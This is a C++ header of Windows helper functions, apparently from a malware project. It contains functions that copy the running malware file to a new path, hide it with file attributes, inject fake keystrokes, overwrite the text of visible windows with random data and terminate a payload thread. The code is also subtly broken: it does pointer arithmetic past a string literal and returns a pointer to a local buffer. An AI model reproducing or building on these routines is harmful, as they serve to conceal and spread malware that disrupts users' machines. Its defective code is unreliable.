#pragma once

#include "include.h"

namespace System
{
    VOID RedrawScreen(VOID)
    {
        RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
    }

    VOID EndPayload(HANDLE hPayload, HANDLE hPML)
    {
        TerminateThread(hPayload, NULL);
        CloseHandle(hPayload);
        HeapDestroy(hPML);
    }

    BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam)
    {
        const WCHAR* labelText = L"" + rand() % 512;

        if (GetWindowLongW(hwnd, GWL_STYLE) & WS_VISIBLE)
        {
            SendMessageW(hwnd, WM_SETTEXT, 0, (LPARAM)labelText);
        }

        return true;
    }

    VOID PressKey(WORD key, INT time)
    {
        INPUT pInputs = { 0 };

        pInputs.type = INPUT_KEYBOARD;
        pInputs.ki.wVk = key;

        SendInput(1, (LPINPUT)&pInputs, sizeof(INPUT));

        Sleep(time);

        pInputs.ki.dwFlags = KEYEVENTF_KEYUP;

        SendInput(1, (LPINPUT)&pInputs, sizeof(INPUT));
    }

    VOID CopyMalwareFile(LPCWSTR orgPathFile, WCHAR dstPathFile[])
    {
        CopyFileW(orgPathFile, dstPathFile, TRUE);
    }

    VOID HideFile(LPCWSTR orgPathFile)
    {
        SetFileAttributesW(orgPathFile, FILE_ATTRIBUTE_HIDDEN);
    }

    LPCWSTR GetCurrentFileDir()
    {
        WCHAR buffer[MAX_PATH];
        GetModuleFileName(NULL, buffer, MAX_PATH);

        return (LPCWSTR)buffer;
    }
}